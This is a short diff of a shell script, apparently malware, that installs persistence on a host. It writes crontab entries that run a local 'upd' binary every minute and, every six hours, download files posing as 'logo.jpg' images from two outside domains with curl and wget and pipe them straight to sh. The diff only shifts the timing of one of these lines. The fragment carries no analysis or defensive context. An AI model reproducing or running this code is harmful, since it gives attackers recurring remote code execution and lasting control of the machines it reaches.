@@ -2,7 +2,7 @@ pwd > dir.dir
 dir=$(cat dir.dir)
 echo "* * * * * $dir/upd >/dev/null 2>&1" > cron.d
 echo "1 */6 * * * curl -fsSL http://3389.space/lx/logo.jpg|sh  >/dev/null 2>&1" >> cron.d
-echo "1 */6 * * * wget -O - -q http://www.qicheqiche.com/plus/img/face/js/logo.jpg|sh  >/dev/null 2>&1" >> cron.d
+echo "2 */6 * * * wget -O - -q http://www.qicheqiche.com/plus/img/face/js/logo.jpg|sh  >/dev/null 2>&1" >> cron.d
 crontab cron.d
 crontab -l | grep upd
 echo "#!/bin/sh
